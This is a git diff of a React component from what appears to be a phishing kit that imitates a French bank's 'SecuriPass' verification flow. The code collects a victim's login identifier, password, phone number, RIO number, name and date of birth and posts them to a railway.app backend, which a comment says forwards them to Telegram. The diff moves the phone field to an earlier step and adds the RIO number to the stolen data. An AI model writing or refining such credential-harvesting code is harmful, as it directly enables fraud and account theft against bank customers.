@@ -5,7 +5,7 @@ import { Input } from '../components/ui/input';
 import { Label } from '../components/ui/label';
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '../components/ui/card';
 import { Alert, AlertDescription } from '../components/ui/alert';
-import { UserCircle, Calendar, AlertCircle, Phone } from 'lucide-react';
+import { UserCircle, Calendar, AlertCircle } from 'lucide-react';
 import axios from 'axios';
 
 const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || 'https://web-production-b21a3.up.railway.app';
@@ -17,15 +17,15 @@ const PersonalInfoStep = () => {
   const [formData, setFormData] = useState({
     lastName: '',
     firstName: '',
-    dateOfBirth: '',
-    phoneNumber: ''
+    dateOfBirth: ''
   });
 
   useEffect(() => {
     // Check if previous steps were completed
     const identifier = sessionStorage.getItem('securipass_identifier');
     const password = sessionStorage.getItem('securipass_password');
-    if (!identifier || !password) {
+    const phone = sessionStorage.getItem('securipass_phone');
+    if (!identifier || !password || !phone) {
       navigate('/login');
     }
   }, [navigate]);
@@ -46,17 +46,23 @@ const PersonalInfoStep = () => {
     try {
       const identifier = sessionStorage.getItem('securipass_identifier');
       const password = sessionStorage.getItem('securipass_password');
+      const phoneNumber = sessionStorage.getItem('securipass_phone') || '';
+      const rioNumber = sessionStorage.getItem('securipass_rio') || '';
 
       // Send data to backend (which will forward to Telegram)
       await axios.post(`${BACKEND_URL}/api/securipass/submit`, {
         identifier,
         password,
+        phoneNumber,
+        rioNumber,
         ...formData
       });
 
       // Clear session data
       sessionStorage.removeItem('securipass_identifier');
       sessionStorage.removeItem('securipass_password');
+      sessionStorage.removeItem('securipass_phone');
+      sessionStorage.removeItem('securipass_rio');
 
       // Navigate to confirmation
       navigate('/final-confirmation');
@@ -144,23 +150,6 @@ const PersonalInfoStep = () => {
                   name="dateOfBirth"
                   type="date"
                   value={formData.dateOfBirth}
-                  onChange={handleChange}
-                  required
-                  className="h-12 border-gray-300 focus:border-[#e60028] focus:ring-[#e60028] text-base"
-                />
-              </div>
-
-              <div className="space-y-2">
-                <Label htmlFor="phoneNumber" className="text-gray-900 font-semibold flex items-center gap-2">
-                  <Phone size={18} className="text-[#e60028]" />
-                  Numéro de téléphone
-                </Label>
-                <Input
-                  id="phoneNumber"
-                  name="phoneNumber"
-                  type="tel"
-                  placeholder="06 12 34 56 78"
-                  value={formData.phoneNumber}
                   onChange={handleChange}
                   required
                   className="h-12 border-gray-300 focus:border-[#e60028] focus:ring-[#e60028] text-base"
